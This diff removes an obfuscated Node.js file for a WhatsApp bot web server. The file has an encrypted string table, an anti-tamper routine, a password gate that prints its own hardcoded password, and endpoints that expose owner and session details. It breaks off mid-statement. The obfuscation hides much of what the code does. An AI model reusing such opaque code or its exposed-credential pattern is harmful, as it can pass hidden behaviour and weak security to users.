@@ -1,1 +1,567 @@
-const a0_0x3683a2=a0_0x3140;(function(_0x430bdd,_0x2d798f){const _0x2aaa04=a0_0x3140,_0x5173aa=_0x430bdd();while(!![]){try{const _0x5e5cae=-parseInt(_0x2aaa04(0x1bf,'eYU7'))/0x1+parseInt(_0x2aaa04(0x183,'cTr7'))/0x2+-parseInt(_0x2aaa04(0x177,'wKFV'))/0x3*(-parseInt(_0x2aaa04(0x1b1,'2yOD'))/0x4)+parseInt(_0x2aaa04(0x1c5,'VaKs'))/0x5*(-parseInt(_0x2aaa04(0x285,'0oTa'))/0x6)+parseInt(_0x2aaa04(0x219,'!l$n'))/0x7+parseInt(_0x2aaa04(0x1c7,'dI)W'))/0x8+-parseInt(_0x2aaa04(0x18d,'eYU7'))/0x9;if(_0x5e5cae===_0x2d798f)break;else _0x5173aa['push'](_0x5173aa['shift']());}catch(_0x23a739){_0x5173aa['push'](_0x5173aa['shift']());}}}(a0_0x3a63,0x7186a));const a0_0x5121c8=(function(){let _0x53f1a5=!![];return function(_0x57cb71,_0x4a919b){const _0x1539f2=_0x53f1a5?function(){const _0x586701=a0_0x3140;if(_0x4a919b){const _0x310690=_0x4a919b[_0x586701(0x26c,'V%o@')](_0x57cb71,arguments);return _0x4a919b=null,_0x310690;}}:function(){};return _0x53f1a5=![],_0x1539f2;};}()),a0_0x4c4d43=a0_0x5121c8(this,function(){const _0x32900c=a0_0x3140;return a0_0x4c4d43[_0x32900c(0x251,'q36!')]()[_0x32900c(0x236,')U((')](_0x32900c(0x229,'uDwg'))[_0x32900c(0x27d,'i#BJ')]()[_0x32900c(0x1f9,'V%o@')](a0_0x4c4d43)['search'](_0x32900c(0x256,'!l$n'));});a0_0x4c4d43();const __DESIRE_PASS=a0_0x3683a2(0x23b,'rsT9'),__VERIFY_ACCESS=()=>{const _0x5a3cd2=a0_0x3683a2,_0x309588=process[_0x5a3cd2(0x22d,'RdZQ')][_0x5a3cd2(0x279,')3vJ')],_0x54cc9d=process[_0x5a3cd2(0x1d0,'0oTa')][_0x5a3cd2(0x1e1,'^74G')](_0x46553b=>_0x46553b[_0x5a3cd2(0x20e,'6d9E')](_0x5a3cd2(0x180,'LaeH')))?.[_0x5a3cd2(0x19d,'0oTa')]('=')[0x1],_0x225837=_0x309588||_0x54cc9d;if(_0x225837!==__DESIRE_PASS)return console[_0x5a3cd2(0x1eb,'%9$2')](_0x5a3cd2(0x27a,'sPMj')),console['error']('\x1b[33m🔐\x20Password:\x20DesireBot2025!\x1b[0m'),console[_0x5a3cd2(0x1f5,'sPMj')](_0x5a3cd2(0x24f,'q#R!')),console[_0x5a3cd2(0x274,'V%o@')]('\x1b[36m\x20\x20\x20Or:\x20set\x20DESIRE_MAIN_PASS=DesireBot2025!\x1b[0m'),![];return!![];};!__VERIFY_ACCESS()&&process[a0_0x3683a2(0x24e,'eYU7')](0x1);console[a0_0x3683a2(0x171,'*lSB')](a0_0x3683a2(0x278,'cTr7'));const {startBot,getAuthPage,getQRCode,requestPairingCode}=require(a0_0x3683a2(0x16d,'2yOD')),express=require(a0_0x3683a2(0x1da,'W[Yv')),bodyParser=require(a0_0x3683a2(0x1fb,')U((')),app=express(),port=process['env'][a0_0x3683a2(0x198,'5TPE')]||0x1f40;app[a0_0x3683a2(0x163,'4C4*')](bodyParser[a0_0x3683a2(0x1f7,']DGx')]()),app[a0_0x3683a2(0x1d4,'o5GO')](bodyParser['urlencoded']({'extended':!![]})),global[a0_0x3683a2(0x259,'2yOD')]=a0_0x3683a2(0x24d,'*lSB'),global[a0_0x3683a2(0x1f0,'PD@e')]=null,global[a0_0x3683a2(0x1a3,'oK$E')]=null,global[a0_0x3683a2(0x268,'rsT9')]=0x0;const getPlatform=()=>{const _0x39e4ca=a0_0x3683a2;if(process[_0x39e4ca(0x23f,'2^pH')][_0x39e4ca(0x187,'^j#0')]||process[_0x39e4ca(0x243,'0oTa')][_0x39e4ca(0x244,'[YD&')])return _0x39e4ca(0x196,'rsT9');if(process[_0x39e4ca(0x190,'4C4*')][_0x39e4ca(0x28c,'W[Yv')]||process['env'][_0x39e4ca(0x221,')3vJ')])return _0x39e4ca(0x1a7,'7%bn');if(process[_0x39e4ca(0x253,']DGx')]['RAILWAY_ENVIRONMENT'])return _0x39e4ca(0x22b,'@yR4');if(process[_0x39e4ca(0x21a,'@yR4')][_0x39e4ca(0x1dd,'4C4*')])return'Heroku';return process[_0x39e4ca(0x270,'sPMj')][_0x39e4ca(0x154,'f&LL')]||_0x39e4ca(0x1d5,'cTr7');},PLATFORM=getPlatform(),CONFIG={'CLEAN_SESSION':process[a0_0x3683a2(0x16c,'6d9E')][a0_0x3683a2(0x1b8,'dI)W')]===a0_0x3683a2(0x16a,'dI)W'),'OWNER_JID':process[a0_0x3683a2(0x22d,'RdZQ')][a0_0x3683a2(0x181,'%9$2')]||a0_0x3683a2(0x26d,'sPMj'),'WHATSAPP_NUMBER':process[a0_0x3683a2(0x270,'sPMj')][a0_0x3683a2(0x214,'7%bn')]||a0_0x3683a2(0x1cc,'q#R!')};function a0_0x3140(_0x4a6268,_0x56a76b){_0x4a6268=_0x4a6268-0x154;const _0x31f12b=a0_0x3a63();let _0x4c4d43=_0x31f12b[_0x4a6268];if(a0_0x3140['kpYWga']===undefined){var _0x5121c8=function(_0x2549f4){const _0x3ce104='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x4e9291='',_0x59b43='',_0x53f1a5=_0x4e9291+_0x5121c8;for(let _0x57cb71=0x0,_0x4a919b,_0x1539f2,_0x310690=0x0;_0x1539f2=_0x2549f4['charAt'](_0x310690++);~_0x1539f2&&(_0x4a919b=_0x57cb71%0x4?_0x4a919b*0x40+_0x1539f2:_0x1539f2,_0x57cb71++%0x4)?_0x4e9291+=_0x53f1a5['charCodeAt'](_0x310690+0xa)-0xa!==0x0?String['fromCharCode'](0xff&_0x4a919b>>(-0x2*_0x57cb71&0x6)):_0x57cb71:0x0){_0x1539f2=_0x3ce104['indexOf'](_0x1539f2);}for(let _0x309588=0x0,_0x54cc9d=_0x4e9291['length'];_0x309588<_0x54cc9d;_0x309588++){_0x59b43+='%'+('00'+_0x4e9291['charCodeAt'](_0x309588)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x59b43);};const _0x33d3df=function(_0x225837,_0x46553b){let _0x4de9a3=[],_0x3c20ad=0x0,_0x4c01de,_0x35e434='';_0x225837=_0x5121c8(_0x225837);let _0x4fa2e7;for(_0x4fa2e7=0x0;_0x4fa2e7<0x100;_0x4fa2e7++){_0x4de9a3[_0x4fa2e7]=_0x4fa2e7;}for(_0x4fa2e7=0x0;_0x4fa2e7<0x100;_0x4fa2e7++){_0x3c20ad=(_0x3c20ad+_0x4de9a3[_0x4fa2e7]+_0x46553b['charCodeAt'](_0x4fa2e7%_0x46553b['length']))%0x100,_0x4c01de=_0x4de9a3[_0x4fa2e7],_0x4de9a3[_0x4fa2e7]=_0x4de9a3[_0x3c20ad],_0x4de9a3[_0x3c20ad]=_0x4c01de;}_0x4fa2e7=0x0,_0x3c20ad=0x0;for(let _0x436762=0x0;_0x436762<_0x225837['length'];_0x436762++){_0x4fa2e7=(_0x4fa2e7+0x1)%0x100,_0x3c20ad=(_0x3c20ad+_0x4de9a3[_0x4fa2e7])%0x100,_0x4c01de=_0x4de9a3[_0x4fa2e7],_0x4de9a3[_0x4fa2e7]=_0x4de9a3[_0x3c20ad],_0x4de9a3[_0x3c20ad]=_0x4c01de,_0x35e434+=String['fromCharCode'](_0x225837['charCodeAt'](_0x436762)^_0x4de9a3[(_0x4de9a3[_0x4fa2e7]+_0x4de9a3[_0x3c20ad])%0x100]);}return _0x35e434;};a0_0x3140['wTFqnB']=_0x33d3df,a0_0x3140['vyIQtP']={},a0_0x3140['kpYWga']=!![];}const _0x3a631f=_0x31f12b[0x0],_0x3140e4=_0x4a6268+_0x3a631f,_0x3ad0bd=a0_0x3140['vyIQtP'][_0x3140e4];if(!_0x3ad0bd){if(a0_0x3140['tbPVpW']===undefined){const _0x7d358c=function(_0xa41e7c){this['mLCpEc']=_0xa41e7c,this['xetONu']=[0x1,0x0,0x0],this['ksNFiI']=function(){return'newState';},this['PsIdSa']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['HWeprC']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x7d358c['prototype']['FbOUQp']=function(){const _0x146030=new RegExp(this['PsIdSa']+this['HWeprC']),_0x34b829=_0x146030['test'](this['ksNFiI']['toString']())?--this['xetONu'][0x1]:--this['xetONu'][0x0];return this['qUDhQJ'](_0x34b829);},_0x7d358c['prototype']['qUDhQJ']=function(_0x3cbf4d){if(!Boolean(~_0x3cbf4d))return _0x3cbf4d;return this['YGtZtc'](this['mLCpEc']);},_0x7d358c['prototype']['YGtZtc']=function(_0x5ba3d0){for(let _0x2fcf0a=0x0,_0x153a35=this['xetONu']['length'];_0x2fcf0a<_0x153a35;_0x2fcf0a++){this['xetONu']['push'](Math['round'](Math['random']())),_0x153a35=this['xetONu']['length'];}return _0x5ba3d0(this['xetONu'][0x0]);},new _0x7d358c(a0_0x3140)['FbOUQp'](),a0_0x3140['tbPVpW']=!![];}_0x4c4d43=a0_0x3140['wTFqnB'](_0x4c4d43,_0x56a76b),a0_0x3140['vyIQtP'][_0x3140e4]=_0x4c4d43;}else _0x4c4d43=_0x3ad0bd;return _0x4c4d43;}function getSessionInfo(){const _0x3efb29=a0_0x3683a2,_0x4de9a3=global['whatsappBot'];if(!_0x4de9a3)return{'connected':![],'message':_0x3efb29(0x277,')U((')};const _0x3c20ad=_0x4de9a3[_0x3efb29(0x1df,'eYU7')]?.[_0x3efb29(0x26b,'rfrx')]||{},_0x4c01de=_0x3c20ad['me']?.['id'];return{'connected':global[_0x3efb29(0x250,'6d9E')]===_0x3efb29(0x26a,'wdmX'),'hasSession':!!_0x4c01de,'registered':_0x3c20ad['registered']||![],'platform':_0x4de9a3[_0x3efb29(0x19c,'4C4*')]?.['platform']||'Unknown','sessionId':_0x4c01de?_0x4c01de[_0x3efb29(0x223,'uMTf')](0x0,0x8)+_0x3efb29(0x288,'w*^#'):_0x3efb29(0x1bc,'@yR4'),'phone':_0x3c20ad['me']?.[_0x3efb29(0x18a,'@yR4')]?_0x3c20ad['me'][_0x3efb29(0x18c,'PD@e')]['substring'](0x0,0x4)+_0x3efb29(0x282,'$fR)'):null,'connectionTime':global[_0x3efb29(0x1ae,'i#BJ')],'cleanSession':CONFIG[_0x3efb29(0x1fd,'rfrx')]};}function a0_0x3a63(){const _0xe448fa=['4PUWW7any8kSWO46WP9Ib8oYB8kvCgLaW5HHW4rHxW','W5RdTbpdLbiSW7nZ','WOqoCCoUlHxdM8o5Bbe6WPS/WPa','ywFcLmog','WQWqW4hcPWmDoG0t','W6hcLJzUW6JdOK5Htq','DgBcKq','eSkLCaddNIdcMgG4','W4b0W4Lgi8o3umkEv2BcRa','WP3dR8oLgSoFzxDlWQm','WOn3oq','WPNdT8oYgSopzw9hWQb7W5fM','smk8j8o5WRKbWQy','FMBcI8oBlSow','xmoVmCo1sSoFer3dThniW5JcNXO','8lIDPXa/wCobW7jGCCoYjYtdO2pdVSoLB8k1emomWQDLW5FcMa','WOiGDa','W5JWSzA6F8oDw05XWPbDW6XmW74n','v2TozSk+WP7cNvDUh8kP','i8oVrSkzW6JcP2W5WPFcTCkq','W7dcJsnpW6JdQLrZ','E8k+W4FdOa','ASomyMVcPVcVKQhdHX3dU1JcNfRdUhlcMmkXwmkVWRJdI2FcNZldKSk9kruMiueCW5iHhCkJW6bzESkcW77cLeK7WOS','WRtcHNBdLtFdGxvXlq','xmoVlSoUw8oxeX8','WQ1hiSoembxdUmo4ohbVW5P5W5JcPSkZWPZdJW','sbbu','8jELSYCFWQNcNSk6bvC5WOCip8omxGSOW75oWPPbWRCgAYuQqSoCqgNWUzgxvbNdNCoPigu2B8odW7bs','zH9wBb/dUmkdWR4','WR9EAg1hW4VdQCoBEquNW44','W7SQB8kdW6e','8j+NTmkux8oGW6KOxSodW4LJhs5RW6ldTmowFSk/cfiNw8ozf8k2WRFdK0T3s8oTW4Purmo2ue0zW4zCBSkVW5hdQ8oe','WQ/cImkGW71CwN84cG','WOZdKrC','W5fWW4DDiG','W73dNru','WPpcLvVcSGyNzSkFyWpdQ18','8ywGRLhcQdGqW5DVtbr7uLNdSalcQaVcThaXWRWQypggOzPzwCovrmk8WP/dJ1eHrG','dr/cIM/dJ8ocyN/cRW','W4OnWPnWWOm','dK/cISo+ggq','WR3dISkcWPpcIW','e8o4nsq','WQddVejEa0KUWQtcNG','WRTsW5hdQbdcOSolW5uyBLyBW6NcOCk0W7OSBc1rExG','pmk1uJqoW5iTcMC','4PYz77I0W4VdGqHYW4RdR1BdOYlcMCoxzGnKW7ZcUmoZorHhsCoboN11mmomnuf8bbZcGW','WRqeDSoMmcddSmo4F1a','W4xdIrtdP1j/v8kEutRdTW','WR3dICkdWO7cI8kOW6rtAa','emkqEruV','iZJcTeBdPa','W5f0WRVdLwfZr3nJWRGqW5xdT8ouWQa7WO7dRsVcR8ogWRW3W7mIW49ola','WOdcRSkNm8on','pMpcTSkAWPhcPCoaWRavuCke','WOyPW7K','zxVcMSkRWRBcMCoBWQK','WONcQqxdKqu/W6bvCG','WPtdPSkUW6TxW5u5W4OS','jZRcTKxdRW','wSkIAW','aeNcRtJdUCkTwmkHWOC','WRhdQ28JW5NcMK8sDsJcU8oHre0FWPNcLeeX','WORdQuhdT1JIN5DIvSkVWRTufbu/mmo/WPddGCoTob8KWQhcRCovW4ziWOhdS2RcQCodW5RdH8k0WOdcH8kIW7xcGCkVnCoSW5CvWPBcJCkQCf9GyrBdOq','WRL2W6VdJsFcG8k0W6W2b2SHW5FcHmohW4q','W7GCWRZdKZZIMPzqbrtdJgBcTCktWRtcL1dcT8omd8kFWPxdSgFdH2NdKKiQbCoYW43dJKJdOmoOWRDcfZPGWOK','WPvTlJXZtG','c1/dJff4W4RdRSkvW6FcHfi','WPhcS8kgkmonWQJcN3i','kWzvr8o5W74tyCklW63cOW','8ykXG8o6W6TxW5u5W4OSoWmbi2vKn8k2iG','WO3dHhHijxCqWPJcQq','8kEXRCo5','WO/cGKW','xFc/LQRVU4xcH8kKDcRcISk9WPJdJ8kFD1y','W5SqWPv+WP3dG8ovW5/cKSk5','W5bygH5xBCoH','jmo9W7iBWQajhCo7xSo5W4FcS8o+W5HpEuGDWQPnhLmxWOT8WRWB','WOlcUCkH','lCoEWPO','WOuLW516WPldR8kMpSk3WR4P','W67cRSonWO4','W5P5W5TbmCoXrq','nCkrdmoCWPaNWPhdICkoW6xdPWPptmkZd2a','WRVcIJddLJCrW4zT','v2TZvmkDWP3cGeTGaG','4P+Mz8okWPOHmbu3jmkVumkdWRldOSk2z8ozW6yMWRtdHSk4iW','W5rZW4zCnCo1vmklCq','CbL1ESor','W78yrcriW4hdQMfQ','WOFcS8kHd8olWQdcHwa0','p0xdIefUW4xdQSkmW4tcH1ubySkIWQldKCkcW4JcQMlcLmoJiLGtWQTKW4a','WOBdQNnIW5NcKvDxEbtcT8o/se8hWPNcGuO','WO0GFsVcMCkSWRFdLaK','aGLhBZxdOSkbWQu','W73dLCoemCoKtLjW','8jwmQf3dIfZdKbmrW4LGgSoEWP9DWOHicCk0EK98oSk7W7ddNCobs0CGtCkWBKaAeG','WQVcQSohWOlcJWfFaCoTnZrapM1O','e8o4jq7cVYf0WPi7','WOpdUSk/','8lsISSobtmkuW6FcNmogWPdcQmoTWO3cK3VdO8oOW6PWW5BdUmkWBcxcLSk8qmoQumkzsX14WRLFW4/dS8oclSoDWR9qWRdcIZO','smkNj8oRWQyCWQhdTa','8yQHNmkoW6RdP8o8iSoNW7/dICkYEfNcTCoFWP3cH8olW4ddRxpdLhG4fLZdQNLSWR7cU3rAkYy','WQtdOY0yFa/dHCkfW5q','WOBcHSkGW49QtMy9','WOddNCofo8oOsa','W6Kfrri','WO/cR8k6mG','WRpcH3q','W6pdImk3W4fgxwiQvGOyW6eIW7/dKc3cRhm3aXxcQd8LsSkPe04aaW','WPhcS8kCd8oWWPlcHwCUW7dcJG','yCkFW4bTW6tdUhjbW4m','WRiwrqnuWO/dRwb4WQyrpW','W6/cLIu','WOddUCopW53dVmoymCo8W7/dMmkPBq3cRSodW4NdHSonWP/cRdJdMJn6lL/dOhmWWQJdR2fCj3uwymoXW6pdOuJdIfHiWPXPsMDQWQNdV8k3gsldI8kbcSoR','cmoUW7a','tXfwxINdRmkAWRTG','WP3dQSkOWQhcOmkuW4nZx8oeW6pcRCoZ','W4LPjIzH','tW7cMHa9WPJdUSkmW7dcM35m','pSoMWO7WUPwLW50mbmobWPZdRrLZW4tdU1y','WRtdLCkcWO4','BJjNtbpdKSk9WOTalHNcQCkz','WOK0W6dcJa','WPddQhrWW5i','icFcShNdQCo8xepcMa','WO7dOCklWRKieSkMvbfvxa','f0JcHmoK','qSkMW6ddMwn4tYnhW59CW5eUWRG','WR4DW5PSWO/dO8kybCkA','j/cCO4fUWO1PoSolWOddKG','WQtcIKpdSGxdPbP7WQRcK0ea','WQOyBCoP','DUkpH8knCwldHSo7W5/cHq','wMFdHdRcUhOLW5BdUmkDrG','W4/cKSo7WQxcPtfXoSksgWrUb1LsWPm','WOmUz8kbW7C3W5PSCwhcOCoKwSkcx8kzW6BcPG7cQ8kCWO5uWRtdUmk3','rrfMWOzofdBcMwhdP8kMdmo9WRJcNSkHFmkPW7LHja','WQqUACkBW6e','fKpcOr8','j8oOymkKW4i','kCo0WPJcRhFdIM0zW6/cJ8oUjwC','wmk1BrVcGW','8jUcS8ohW6a1W51Syt3dKCkdWOCjWP0kW4NdP8k1WP3cM8k3fmoSisBcSCo3W67dSa','WPpdP8kS','W5NdVSk/W5PlW5SIW5q','BSoNW65v','WP07CJhcICk8','v8k0CbO','WR3cImkNW5O','WOSeE8oIpG','qSoZeSo0','vmoBW5nV','BsNcSv7dTq','W7ldNrZcQ1dcStzYWQG','4PI477QJqSkIFx9jWPvDm8o2qSoSj8okz8kQWRe','WOpdUSk/W4O','WPvPiYfY','uKtcOSoZdSoSuu0aW6xdQSkNkq','w8o1hSo5tmondG','W6buW6LMa8oxCmk+sKFcJCkIW7vdEG','W4jSW5XBpCoZ','8jwsS13dIfZdKbmrW4LGgSoEWP9DWPfchSk1Fr0RjmkMW6ZcLCkGyuuSrSo1hMaseG4JW53cI2hdSmoKiYNcImoP','kwpcKCkNWRVcLCoaWQStuCk3W41qDW','WOS9ysRcJG','WQpdTmowW50','cfldLve','B8kICrdcLdS','ybb1','zmkvW4a','4Oor4OkM4Oc54OcH4Okv4Oox','8yA0Nw8DAf7dK8kDWPRcV8oxW5xdSSk5W5RcSmoMzmoJCNVcOG','8jsDRGjAomoVWOBcOxWwCmkuWRlcVSoFma3cUmkAWO08W68FWPCJWOraW4NcNW','bSksAbGXW6G','WOBcS8k7mSoAWQlcHxWOW7dcVxRcRSks','aJNcHCkHtmomW5WvWOVcJHS/Bq','WPxcPuFdHW3dV1jbdty1xr0','W7ZdLCk2W7HlswWE','WPxdPSkn','WOpdQ2H3','WOqIW7S','W4y5B/cTP78DW7hcHmkyWRBdJCovW6tcPmokWQBdV3/dPcC1','W4WQW6dcJdG2hZy','W5hdHa3dRfS','W547DtzYW7/dJvfkWOeTa8oi','W4utlICjWPa','xSo/ndZcPZrO','hmo/W6xdIgvI','WPOPCSovW6udW550ng3cUSo5gCknrmkiWQi','CCo6W6jAWQyAgSo/A8oOW4RcSCkUW5HoCWy','W7ldKWlcSvZcVsW','lmo/WPFcPhRdIH0eW7FcV8oJgq','WRldVfHQ','8j+NOmkuF8oLW61UuCoEWP1Mes57W67dV8kyACk/CL07wCou','8koNPJWWkCo5cg5rm8k2bCkLWR3cGCknpX5cAqCV','WOq8FcS','sSoVcCojxCoFcq3dLa','CKFdS8orn8kJWRO2WQJcLXK9uq','WPCOW7VcGZ0sgsOWW7W','WQLobKylWPNcRezvWP4afSom','b8oYiY7cOI9U','W7FcLGTUW5pdKe5Mv8ouWOW','WPaVW7RcLIuRhImiW6TmWPhcRG','WOT8pdTNwSox','q8kKzwRdU3e3W5b8WR8oWPvn','qwTJta','WO3dR8kQWQNcOmkF','WRVdVSoj','WODRkd4','WRVdNSkeWPq','i8oYpZNcRJi','W4e8zYtcImk6WRa','W5OmWOq','W5RdKWBcPhFcPY9N','8lIcKHa+uSodW7f5Cmk8a2ZdKwxdT8k3imo1e8kt','p3ZcI8kGWRpcKW','W5BdHapdTK1Xv8kdDJVdTW','FwFdIIdcRJS7W5pdL8kqv8k4vqJcK8kxWPBdKGj9W4ldMIfr','aSkSmSoQWRagWR0','W6NcII1t','W4O/CsnVW6hdJKrgWPWXaCoerCoh','WR7dJmkiW7DOW6esW74puxXGevXa','4P6sWOBcVCkbWOFcUCo5wgVcT8ojWO3dMqRcH8ohWQ4bW5pcMe7dHsZdU3RcMmkNx8ki','F8kZW5RdVbhcIt0CW4u','W5TZW48','rw1Puq','B8kFW5m','WRldQmkEWQW5bSk7va','WOr2oXTYxmogWP3cJG','kI3cPuBdQCo1uq','W6RcIGfsW7ldRv93sSoFWO8','W4LQoY1Nuq','yLJdQWVcMuqFW6/dVG','WQddMXO4ta','4P+Mz8okWPOHmbu3jmkVumkdWRldOSk2z8ozW6yMWRtdHSk4i8kJA8otsJSfWRNdNCo6qCk5','WPq4W6zgWQ8','WOhdHWWZ','EFghSR1rf8oSeYjHi8kOaCoKWPZcKmkqjaLy','WQ7dVfe','sbPHWOPoh3RcKbNdSCoJkmk6W7pdNa','imoOBSk+W5tcLwG7WRZcTmkd','8yYDImo0W7LnwwmIfJzqW4u4W6JdGtlcTv4Sv1VdOIS0qCkUeG8b','u2XOw8kuWOpcNeHLfmk8','mmk8i8oSWQy0WR7dQSoRW5xdNJCSz8kdmGqtW4BdQmkacq','W4ZcRGX4W47dNhbDEG','WOy1W73cJsm','eSkKnSoXWRGq','rW1nyW','W6JcSSof','isFcQLNdQCoVxvxcN8oNjq','WPJdGaiPwYm','WPhdQ396WPRcHvPaBYpcOa','WPhdRmkU','mmkUwtasW5i0bNafWOW+WOO','8lsRV8obwSkjW6pdJSouWOBcUCkLWPhcMwlcTCoyW4OCWOtdUCkXogZcO8kId8oWtmkuxX1NWQWw','bvVcSCkmWOZcQCo+WOS4','WPqYW6raWQ/dMCkHdCkQ','ccfDqmoLW6W3q8k9W43cKCkLvmkbvW','W6ZdIrhdSv93qSotqc3dS1xcRt3dJhZdPmo7WRBcOt7dSWjDASoE','bmkkFquVW6Wxm2e5WRe','W6b/mmoeWRnpWPHohu/cQSokma','8ywGJfhdMq','WPpcUCkNl8owWQ7cNW','o8kJmhG','WQ0dvGtcSSkqWPddTd42WR4mW6C','W51VW4DC','W7eyvW','naxcTmkjB8o2','W5KsqX5oW4xcS3fbWRDegSk3lSkL','evtcJa','WQxcNwpdTdFdK1zTkG0','W6aOWQ9AWQpdJmo2W7JcSq','WPaIW6hcHGeWftCYW6faWOpcLCoKWRD0WO3dOa','FSklwJxcVXBcPuSevsHYhq','dKNcVG','wM7dLYdcONuY','ASkpxIdcOGJcPL4isdrWeCkokW','W4dcTqD8W5ldNgLrBCoPWQikW54','jMpcMa','WOnRpsD0','cudcUSkiWPdcQCoNWOCVBmkQW6TZ','WQffDNzzW5RdSCk5oKDVWPjt','WReOCa','iSk4kMlcTSkjpCkwwKpdSNBdMW','WOpdKqiXwJJdTG','WRZdICkzWRpcMSkQW6rdFW','WOi+W7vDWQJdJW','8lsLU8obsSkFW7VdNCoFWPhcPSoGWOBdNelcPSoxW51FWOldPCkWod8','W7OtmZanWOxcPW','WQ92W7BdGddcLa','W6hcS8ou','dK7cICo5gwxdK8kSua','zSo7W7vOWQCCbSo+xq','WPNcVKZdGXhdV0TngG','W4umWO5X','BHb2WPO','qMhdIsFcPx4','W5hcOCocW6nqwSo9dxGta3e','BCkYW4/dOdFcJG','WOyNB8kzW7mxW5m','WQLoaq1uySo4WQhcUq','WQFdVua','W67cS2n9a0e3WRtdLZK','8lIfKba5u8oeW7S6C8kHxMW','4PYUbSkFcSoKWQbjWRddLgeKWR3dQSolWQ8WWPxdIHbcW4qr','W7jFWRjRWPddP8ojW4ldJ8oQ','isFcQKtdUmo+xf/cHmoMa33cKaW','qpcCLzRVU4BdVSkMW5JcOWHzWOZdLLaOdq','g8oKpJm','WPfCW58','WOddOxPXW5tcNq','W6dcQfFdKbldSfi','WOqoCCoUlHxcTmoZqeyQW787WP/dUq'];a0_0x3a63=function(){return _0xe448fa;};return a0_0x3a63();}app['get']('/',(_0x35e434,_0x4fa2e7)=>{const _0x37742e=a0_0x3683a2,_0x436762=getSessionInfo(),{isConnected:_0x7d358c}=getQRCode();_0x4fa2e7[_0x37742e(0x194,'7%bn')]({'status':_0x37742e(0x228,'ZQK0'),'bot':_0x37742e(0x1ef,'qjHr'),'platform':PLATFORM,'config':{'owner':CONFIG[_0x37742e(0x242,'[YD&')],'whatsapp_number':CONFIG[_0x37742e(0x1a0,'TWiz')],'clean_session':CONFIG[_0x37742e(0x208,'b20X')]},'deployment':{'platform':PLATFORM,'node_version':process['version'],'uptime':process['uptime']()},'botStatus':global[_0x37742e(0x17d,'V%o@')],'connected':_0x7d358c,'session':_0x436762,'timestamp':new Date()[_0x37742e(0x1c9,'*lSB')]()});}),app['get'](a0_0x3683a2(0x158,'i1BV'),(_0xa41e7c,_0x146030)=>{const _0x185575=a0_0x3683a2;global[_0x185575(0x1c6,'sPMj')]=(global[_0x185575(0x155,'^74G')]||0x0)+0x1;const _0x34b829=getSessionInfo(),{isConnected:_0x3cbf4d}=getQRCode();_0x146030[_0x185575(0x1db,'*lSB')]({'status':_0x185575(0x1c0,'RdZQ'),'bot':_0x185575(0x238,'rsT9'),'platform':PLATFORM,'config':{'owner':CONFIG[_0x185575(0x225,'6d9E')],'clean_session':CONFIG[_0x185575(0x17a,']DGx')]},'botStatus':global['botStatus'],'connected':_0x3cbf4d,'session':_0x34b829,'uptime':process[_0x185575(0x20b,'VaKs')](),'total_pings':global[_0x185575(0x284,'o5GO')],'timestamp':new Date()['toISOString']()});}),app[a0_0x3683a2(0x287,'i#BJ')](a0_0x3683a2(0x245,'W[Yv'),(_0x5ba3d0,_0x2fcf0a)=>{const _0x2bc640=a0_0x3683a2;_0x2fcf0a['status'](0xc8)[_0x2bc640(0x197,'q36!')]({'status':_0x2bc640(0x1e5,'V%o@'),'platform':PLATFORM,'config':{'owner':CONFIG['OWNER_JID'],'clean_session':CONFIG['CLEAN_SESSION']},'uptime':process[_0x2bc640(0x1ad,'rfrx')](),'botStatus':global[_0x2bc640(0x224,'5TPE')],'timestamp':new Date()[_0x2bc640(0x24c,'PD@e')]()});}),app[a0_0x3683a2(0x1a9,'w*^#')](a0_0x3683a2(0x1d3,'b20X'),(_0x153a35,_0x42285e)=>{const _0x5a0591=a0_0x3683a2,_0x26a060=getSessionInfo(),{isConnected:_0x4d5b54}=getQRCode();_0x42285e[_0x5a0591(0x1f7,']DGx')]({'status':_0x5a0591(0x246,'2^pH'),'platform':PLATFORM,'config':{'owner':CONFIG[_0x5a0591(0x1e8,'ZQK0')],'whatsapp_number':CONFIG['WHATSAPP_NUMBER'],'clean_session':CONFIG[_0x5a0591(0x215,'*lSB')]},'botStatus':global[_0x5a0591(0x23e,'*lSB')],'connected':_0x4d5b54,'session':_0x26a060,'deployment':{'platform':PLATFORM,'port':port,'environment':process[_0x5a0591(0x222,'^j#0')]['NODE_ENV']||_0x5a0591(0x269,'$fR)')},'uptime':process[_0x5a0591(0x1a1,'TWiz')](),'timestamp':new Date()[_0x5a0591(0x26f,'oK$E')]()});}),app[a0_0x3683a2(0x23c,'2^pH')](a0_0x3683a2(0x191,'4C4*'),async(_0x2291dd,_0x1dd46f)=>{const _0xd47765=a0_0x3683a2;try{const {message:_0x982569,sender:_0x2b0aa0,chat:_0x29029c,type:_0x4d2a8f}=_0x2291dd[_0xd47765(0x227,'qjHr')];console['log'](_0xd47765(0x1d6,'dI)W'),{'from':_0x2b0aa0?.['phone']||_0x2b0aa0?.['id'],'message':_0x982569?.['text']||_0x982569?.[_0xd47765(0x1be,'cTr7')],'type':_0x4d2a8f,'platform':PLATFORM});if(!global['whatsappBot']||global[_0xd47765(0x1e4,'0oTa')]!==_0xd47765(0x15d,'b20X'))return _0x1dd46f[_0xd47765(0x1bb,'LaeH')](0x1f7)['json']({'success':![],'error':_0xd47765(0x188,'@yR4'),'botStatus':global['botStatus'],'platform':PLATFORM});_0x4d2a8f===_0xd47765(0x18b,'gRhU')&&_0x982569?.[_0xd47765(0x1a5,'^LP1')]?(await global[_0xd47765(0x17e,'uDwg')]['sendMessage'](CONFIG[_0xd47765(0x280,'RdZQ')],{'text':_0xd47765(0x25e,'f&LL')+_0x982569[_0xd47765(0x1a6,'wKFV')]+_0xd47765(0x182,'ZQK0')+(_0x2b0aa0?.[_0xd47765(0x1b7,'$fR)')]||_0x2b0aa0?.['id'])+_0xd47765(0x283,'PD@e')+PLATFORM+'\x0a⏰\x20Time:\x20'+new Date()['toLocaleString']()}),_0x1dd46f[_0xd47765(0x17f,'uMTf')]({'success':!![],'handled':!![],'message':'Forwarded\x20to\x20WhatsApp','platform':PLATFORM,'timestamp':new 